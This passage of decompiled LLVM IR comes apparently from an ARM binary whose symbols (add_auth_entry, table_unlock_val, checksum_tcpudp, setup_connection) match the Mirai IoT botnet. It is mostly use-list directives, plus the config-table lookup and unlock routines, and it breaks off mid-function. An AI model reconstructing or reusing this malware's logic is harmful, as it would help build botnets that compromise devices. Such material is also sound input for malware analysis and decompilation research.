  uselistorder i32* %r3.global-to-local, { 62, 63, 64, 65, 66, 67, 68, 73, 74, 69, 75, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 23, 86, 0, 70, 71, 24, 25, 26, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 72, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 110, 111, 113, 112, 109, 114, 154, 155, 115, 116, 156, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 157, 133, 134, 135, 136, 138, 137, 140, 139, 153, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152 }
  uselistorder i32* %r2.global-to-local, { 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 51, 52, 53, 54, 10, 0, 46, 47, 11, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 48, 49, 102, 106, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 98, 101, 67, 68, 70, 69, 66, 292, 71, 293, 72, 294, 295, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 99, 100, 103, 104, 105, 107, 108, 109, 110, 291, 112, 111, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290 }
  uselistorder i32* %r1.global-to-local, { 39, 40, 41, 42, 43, 44, 45, 54, 46, 47, 48, 49, 55, 56, 57, 8, 1, 2, 50, 51, 9, 10, 0, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 165, 166, 52, 53, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 81, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 277, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276 }
  uselistorder i32* %r0.global-to-local, {}
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i1* %cpsr_z.global-to-local, { 130, 108, 109, 125, 126, 131, 132, 144, 216, 211, 31, 32, 34, 110, 220, 112, 114, 115, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 122, 113, 19, 20, 25, 21, 22, 23, 24, 26, 27, 28, 29, 30, 33, 111, 35, 41, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 47, 51, 52, 53, 48, 49, 50, 54, 55, 56, 57, 58, 59, 63, 64, 65, 60, 61, 62, 66, 67, 68, 69, 70, 71, 75, 76, 77, 72, 73, 74, 78, 79, 80, 81, 82, 83, 87, 88, 89, 84, 85, 86, 90, 91, 92, 93, 94, 95, 99, 100, 101, 96, 97, 98, 102, 103, 104, 105, 106, 107, 116, 117, 118, 119, 133, 135, 134, 136, 137, 138, 139, 140, 141, 142, 143, 120, 121, 145, 146, 147, 148, 150, 149, 151, 152, 153, 156, 158, 159, 157, 154, 155, 127, 128, 123, 160, 124, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 219, 193, 194, 195, 196, 197, 218, 198, 199, 200, 217, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 212, 213, 214, 129, 215 }
  uselistorder i1* %cpsr_c.global-to-local, { 125, 105, 106, 126, 120, 121, 127, 139, 213, 203, 28, 29, 31, 107, 211, 108, 110, 111, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 115, 109, 16, 17, 22, 18, 19, 20, 21, 23, 24, 25, 26, 27, 30, 212, 32, 38, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 48, 49, 50, 45, 46, 47, 51, 52, 53, 54, 55, 56, 60, 61, 62, 57, 58, 59, 63, 64, 65, 66, 67, 68, 72, 73, 74, 69, 70, 71, 75, 76, 77, 78, 79, 80, 84, 85, 86, 81, 82, 83, 87, 88, 89, 90, 91, 92, 96, 97, 98, 93, 94, 95, 99, 100, 101, 102, 103, 104, 112, 113, 114, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 117, 116, 140, 141, 142, 143, 144, 145, 146, 149, 151, 152, 150, 147, 148, 122, 123, 118, 153, 119, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 210, 184, 185, 186, 187, 188, 209, 189, 190, 191, 208, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 204, 205, 206, 124, 207 }
  uselistorder i32 ptrtoint (i16** @global_var_23a30.70 to i32), { 3, 0, 1, 2 }
  uselistorder i16** @global_var_20f60.125, { 1, 0 }
  uselistorder i16* bitcast (i16** @global_var_20f60.125 to i16*), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i8 31, { 6, 0, 1, 2, 3, 7, 4, 5 }
  uselistorder i8 30, { 4, 0, 1, 5, 2, 3 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i8 -4, { 3, 4, 1, 5, 2, 6, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), { 5, 7, 6, 8, 0, 9, 3, 10, 1, 11, 2, 12, 4, 13 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 11, 10, 9, 8, 7, 6, 5, 27, 23, 22, 26, 25, 24, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 4, 3, 2, 1, 0 }
  uselistorder i8 37, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11 }
  uselistorder i8 34, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 36, { 4, 5, 0, 1, 2, 3, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 22, 23, 24, 25 }
  uselistorder i8 35, { 4, 5, 6, 7, 0, 1, 2, 3, 8, 9, 10, 11, 20, 21, 22, 23, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 26, 27 }
  uselistorder i8 58, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 57, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 62, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i8 61, { 2, 3, 0, 1, 4, 5, 10, 11, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 (i32)* @table_lock_val, { 9, 18, 17, 8, 19, 16, 15, 14, 13, 12, 11, 10, 7, 0, 5, 4, 3, 6, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @util_memsearch, { 3, 1, 4, 2, 0 }
  uselistorder i32 (i32, i32*)* @table_retrieve_val, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 18, 12, 13, 14, 11, 15, 16, 17 }
  uselistorder i32 (i32)* @table_unlock_val, { 10, 9, 18, 17, 16, 15, 14, 13, 12, 11, 8, 0, 6, 5, 4, 7, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @setup_connection, { 2, 1, 0 }
  uselistorder i32 254, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 5, { 11, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_recvfrom, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @checksum_tcpudp, { 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i16 4873, { 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32 (i32, i32)* @checksum_generic, { 10, 9, 8, 7, 0, 6, 1, 5, 4, 3, 2 }
  uselistorder i32 16711680, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 223, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_186b8.480 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_18590.430 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18558.418 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1851c.402 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_184fc.394 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_184f4.392 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_184bc.376 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_184ac.372 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_184a4.370 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_18488.362 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_18400.334 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_183f8.332 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_183f0.328 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_183cc.320 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_183bc.316 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_18390.306 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_18380.302 to i32), { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18378.300 to i32), { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18344.286 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_18320.276 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_182c0.254 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1812c.244 to i32), { 0, 5, 1, 2, 3, 6, 4, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_18244.226 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_181f0.208 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_181d0.202 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_181c4.200 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_181bc.198 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_181b4.196 to i32), { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_181a8.192 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([14 x i8]* @global_var_18198.190 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_18188.186 to i32), { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_182c4.182 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18168.178 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18160.176 to i32), { 1, 7, 2, 8, 0, 9, 3, 4, 5, 10, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_18158.174 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1814c.172 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_18550.170 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18144.168 to i32), { 0, 7, 1, 8, 2, 9, 3, 10, 4, 5, 6, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_1813c.166 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_18134.164 to i32), { 0, 6, 3, 7, 1, 8, 2, 9, 4, 10, 5, 11 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_18120.160 to i32), { 0, 6, 1, 7, 2, 3, 4, 8, 5, 9 }
  uselistorder i32 ptrtoint (i32* @global_var_18110.156 to i32), { 2, 0, 3, 4, 1, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_18618.150 to i32), { 7, 46, 8, 47, 9, 48, 10, 49, 0, 50, 11, 51, 12, 52, 13, 53, 1, 54, 2, 55, 3, 56, 14, 57, 4, 58, 15, 59, 5, 60, 16, 61, 17, 62, 18, 63, 6, 64, 19, 65, 20, 66, 21, 67, 22, 68, 23, 69, 24, 70, 25, 71, 26, 72, 27, 73, 28, 74, 29, 75, 30, 76, 31, 77, 32, 78, 33, 79, 34, 80, 35, 81, 36, 82, 37, 83, 38, 84, 39, 85, 40, 86, 41, 42, 43, 87, 44, 88, 45, 89 }
  uselistorder i32 (i32, i32, i32)* @add_auth_entry, { 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 0, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_18474.148 to i32), { 6, 56, 7, 57, 8, 58, 9, 59, 0, 60, 10, 61, 1, 62, 11, 63, 2, 64, 12, 65, 13, 66, 14, 67, 3, 68, 15, 69, 16, 70, 17, 71, 18, 72, 19, 73, 20, 74, 4, 75, 21, 76, 22, 77, 23, 78, 24, 79, 25, 80, 26, 81, 27, 82, 28, 83, 29, 84, 30, 85, 31, 86, 32, 87, 33, 88, 34, 89, 35, 90, 36, 91, 37, 92, 38, 93, 39, 94, 40, 95, 41, 96, 42, 97, 43, 98, 44, 45, 46, 99, 47, 100, 48, 101, 49, 102, 50, 103, 51, 104, 5, 105, 52, 106, 53, 107, 54, 108, 55, 109 }
  uselistorder i32 ptrtoint (i32* @global_var_185d0.146 to i32), { 4, 16, 5, 17, 6, 18, 0, 19, 1, 20, 7, 21, 2, 22, 8, 23, 9, 24, 10, 25, 11, 26, 12, 27, 13, 28, 14, 29, 15, 30, 3, 31 }
  uselistorder i8* @global_var_20f55.143, { 1, 0 }
  uselistorder i16* @global_var_20f4a.142, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2 }
  uselistorder i8 6, { 2, 0, 3, 4, 5, 6, 1 }
  uselistorder i8 16, { 0, 1, 2, 4, 3, 12, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_20f48.137 to i32), { 1, 2, 0, 3, 4 }
  uselistorder i8* @global_var_20f54.138, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_20f34.134, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_20f34.134 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @rand_next, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 7, 6, 5, 4, 3, 2, 1, 0, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_23a44.132, { 1, 2, 3, 4, 0, 5 }
  uselistorder i16 254, { 1, 2, 0 }
  uselistorder i32* @global_var_23a40.130, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 2, 3, 7, 0, 1, 4, 5, 6, 8 }
  uselistorder i32* @global_var_20f64.119, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @__GI_time, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 21, 22, 10, 11, 12, 13, 18, 19, 20, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @rand_init, { 1, 0 }
  uselistorder i32* @global_var_23a2c.55, { 3, 4, 0, 1, 2, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32 ptrtoint (i32* @global_var_23a2c.55 to i32), { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 ()* @util_local_addr, { 2, 1, 0 }
  uselistorder i32* @global_var_23a48.117, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f340, { 1, 0 }
  uselistorder label %bb428, { 1, 0 }
  uselistorder label %dec_label_pc_f25c, { 1, 0 }
  uselistorder label %dec_label_pc_e618.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e618.backedge.thread528, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_e618.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f000, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 0 }
  uselistorder label %dec_label_pc_ef34, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_ef2c, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_ef1c, { 1, 0 }
  uselistorder label %dec_label_pc_eeac, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread114, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ee78, { 1, 0 }
  uselistorder label %.thread110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ee58, { 1, 0 }
  uselistorder label %dec_label_pc_ee44, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ee00, { 1, 0 }
  uselistorder label %dec_label_pc_ee00.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ede0, { 5, 3, 4, 1, 0, 6, 2 }
  uselistorder label %dec_label_pc_edac, { 1, 0 }
  uselistorder label %thread-pre-split103, { 1, 0 }
  uselistorder label %dec_label_pc_ed5c, { 1, 0 }
  uselistorder label %dec_label_pc_ec74, { 1, 0 }
  uselistorder label %dec_label_pc_eba8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_eb90, { 1, 0 }
  uselistorder label %dec_label_pc_ead4, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_eabc, { 1, 0 }
  uselistorder label %dec_label_pc_ea00, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_e9e8, { 1, 0 }
  uselistorder label %dec_label_pc_e92c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_e914, { 1, 0 }
  uselistorder label %dec_label_pc_e858, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_e840, { 1, 0 }
  uselistorder label %dec_label_pc_e720, { 6, 1, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb390, { 1, 0 }
  uselistorder label %bb388, { 1, 0 }
  uselistorder label %dec_label_pc_e6e4, { 1, 0 }
  uselistorder label %dec_label_pc_e67c, { 1, 0 }
  uselistorder label %.thread63, { 1, 0 }
  uselistorder label %dec_label_pc_e630, { 1, 0 }
  uselistorder label %dec_label_pc_e620, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e620.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_e5f8, { 1, 0 }
  uselistorder label %dec_label_pc_e550, { 1, 0 }
  uselistorder label %bb384, { 1, 0 }
  uselistorder label %bb382, { 1, 0 }
  uselistorder label %bb380, { 1, 0 }
  uselistorder label %bb378, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_e444.dec_label_pc_e444_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e424.dec_label_pc_e424_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e418, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_e410, { 1, 0 }
  uselistorder label %dec_label_pc_e3ec, { 1, 0 }
  uselistorder label %dec_label_pc_e3c8, { 1, 0 }
  uselistorder label %dec_label_pc_e27c, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_e268, { 1, 0 }
  uselistorder label %.thread39, { 1, 0 }
  uselistorder label %dec_label_pc_e0f4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e0d0, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e0a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e07c, { 1, 0 }
  uselistorder label %bb350, { 1, 0 }
  uselistorder label %dec_label_pc_e028, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_d304, { 1, 0 }
}

define i32 @table_retrieve_val(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_23a50.509 to i32), i32* @r2, align 4
  %v3_f34c = mul i32 %arg1, 8
  %v2_f350 = add i32 %v3_f34c, ptrtoint (i32* @global_var_23a50.509 to i32)
  store i32 %v2_f350, i32* @r3, align 4
  %v2_f354 = icmp eq i32* %arg2, null
  br i1 %v2_f354, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_f35c4 = inttoptr i32 %v2_f350 to i32*
  %v4_f35c5 = load i32, i32* %v3_f35c4, align 4
  br label %bb7

bb:                                               ; preds = %entry
  %v2_f358 = add i32 %v3_f34c, add (i32 ptrtoint (i32* @global_var_23a50.509 to i32), i32 4)
  %v3_f358 = inttoptr i32 %v2_f358 to i16*
  %v4_f358 = load i16, i16* %v3_f358, align 4
  %v5_f358 = zext i16 %v4_f358 to i32
  store i32 %v5_f358, i32* @r3, align 4
  %v3_f35c = inttoptr i32 %v2_f350 to i32*
  %v4_f35c = load i32, i32* %v3_f35c, align 4
  store i32 %v5_f358, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_f35c6 = phi i32 [ %v4_f35c5, %.thread ], [ %v4_f35c, %bb ]
  ret i32 %v4_f35c6

; uselistorder directives
  uselistorder i32 %v2_f350, { 1, 0, 2 }
  uselistorder i32 %v3_f34c, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @table_lock_val(i32 %arg1) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f374 = mul i32 %arg1, 8
  %v2_f378 = add i32 %v3_f374, ptrtoint (i32* @global_var_23a50.509 to i32)
  %v2_f37c = load i32, i32* @global_var_20dac.512, align 4
  store i32 %v2_f37c, i32* @r1, align 4
  %v1_f380 = add i32 %v3_f374, add (i32 ptrtoint (i32* @global_var_23a50.509 to i32), i32 4)
  %v2_f380 = inttoptr i32 %v1_f380 to i16*
  %v3_f380 = load i16, i16* %v2_f380, align 4
  %v3_f384 = udiv i32 %v2_f37c, 256
  %v2_f388 = icmp eq i16 %v3_f380, 0
  store i1 %v2_f388, i1* @cpsr_z, align 1
  %v3_f38c = udiv i32 %v2_f37c, 65536
  store i32 %v3_f38c, i32* @r3, align 4
  %v3_f390 = load i32, i32* @r4, align 4
  store i32 %v3_f390, i32* %stack_var_-16, align 4
  %v1_f394 = urem i32 %v3_f384, 256
  store i32 %v1_f394, i32* %r6.global-to-local, align 4
  %v1_f398 = urem i32 %v3_f38c, 256
  store i32 %v1_f398, i32* %r5.global-to-local, align 4
  %v3_f39c = udiv i32 %v2_f37c, 16777216
  store i32 %v3_f39c, i32* %r4.global-to-local, align 4
  %v1_f3a0 = urem i32 %v2_f37c, 256
  store i32 %v1_f3a0, i32* %lr.global-to-local, align 4
  br i1 %v2_f388, label %dec_label_pc_f3fc, label %dec_label_pc_f3a8

dec_label_pc_f3a8:                                ; preds = %entry
  store i32 0, i32* @ip, align 4
  %v1_f3ac = inttoptr i32 %v2_f378 to i32*
  br label %dec_label_pc_f3ac

dec_label_pc_f3ac:                                ; preds = %dec_label_pc_f3ac.dec_label_pc_f3ac_crit_edge, %dec_label_pc_f3a8
